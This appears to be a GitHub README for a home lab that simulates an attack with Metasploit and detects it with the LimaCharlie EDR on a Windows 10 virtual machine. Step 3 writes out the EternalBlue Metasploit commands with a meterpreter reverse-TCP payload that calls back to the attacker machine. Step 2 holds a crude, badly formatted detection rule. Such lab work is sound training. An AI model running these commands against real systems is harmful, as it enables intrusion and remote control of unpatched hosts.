# EDR Home Lab for Attack & Defense Simulation

## Objective
[Brief Objective - Remove this afterwards]

This lab simulates a realistic attack and defense scenario using Metasploit for offensive operations and LimaCharlie for endpoint detection and response (EDR). It is designed to provide hands-on experience in attack simulation, threat detection, and incident response.

### Skills Learned
[Bullet Points - Remove this afterwards]

- Installing and configuring the LimaCharlie agent on endpoints.
- Writing and deploying custom detection rules based on MITRE ATT&CK techniques.
- Monitoring endpoint activity (e.g., process creation, network connections, file system changes) using LimaCharlie’s dashboard.
- Using LimaCharlie to respond to threats (e.g., isolating an endpoint, terminating malicious processes).
- Utilizing Metasploit for penetration testing and attack simulation.
- Identifying and interpreting malicious activity through logs and telemetry.
- Using LimaCharlie to contain threats by isolating infected endpoints.
- Documenting and reporting findings to improve defensive strategies.
- Analyzing attack simulations and documenting responses.
- Problem-solving and troubleshooting during environment setup or attack execution.


### Tools Used
[Bullet Points - Remove this afterwards]

- Metasploit Framework: To simulate cyberattacks.
- LimaCharlie: For EDR capabilities such as telemetry, rule-based detections, and incident response.
- VirtualBox/VMware: To create isolated virtual environments.
- Kali Linux: The attacker machine. -Windows 10 VM: The target endpoint with a LimaCharlie agent installed.
- MITRE ATT&CK Framework: To map attack techniques for defense strategies.

## Steps
Step 1: 
Create the Environment Why: A controlled environment ensures safe experimentation.
Steps:
Install VirtualBox or VMware. Create a VM for Kali Linux (attacker machine).
![Screenshot 2024-11-29 080948](https://github.com/user-attachments/assets/04d0def3-687e-4d9e-a117-ee4ef306fe15)

Create a VM for Windows 10 (target machine). Allocate at least 2GB RAM and 20GB storage.
![Screenshot 2024-11-26 155738](https://github.com/user-attachments/assets/f3b44589-0c2f-4e9f-a273-960751090b43)

Install LimaCharlie agent on the Windows VM. Follow LimaCharlie’s agent installation guide.
![Screenshot 2024-11-26 155632](https://github.com/user-attachments/assets/6ca40403-2c66-476f-bd3d-b3fb901fad87)
![Screenshot 2024-11-26 155448](https://github.com/user-attachments/assets/95f0711f-79bf-492e-86d3-ffda3265d7b5)

Skills Learned:
Setting up and managing virtual machines. Configuring an EDR agent on endpoints. Step 2: Configure LimaCharlie Why: To monitor the target system’s activities and test detections.
Steps:
Sign up for a free LimaCharlie account. Add the Windows VM as an endpoint. Create detection rules (e.g., for reverse shell or privilege escalation). Example Rule: yaml Copy code name: "Detect Reverse Shell" detection: queries: - evt.type == "new_process" and process.command_line contains "powershell.exe" response:
tag_alert
isolate Skills Learned:
Configuring detection rules based on suspicious behaviors. Managing EDR platforms. Attack Simulation Step 3: Simulate an Attack with Metasploit Why: To replicate a real-world attack scenario and evaluate the defense system.
Steps:
Launch Metasploit on the Kali Linux VM. Use the EternalBlue exploit to target the Windows VM: Command: bash Copy code use exploit/windows/smb/ms17_010_eternalblue set RHOST [Windows VM IP] set PAYLOAD windows/meterpreter/reverse_tcp set LHOST [Kali Linux IP] set LPORT 4444 exploit Observe the behavior on the Windows VM (a reverse shell should be established). Skills Learned:
Using Metasploit to simulate attacks. Understanding exploit mechanisms. Ref 1: Network Diagram

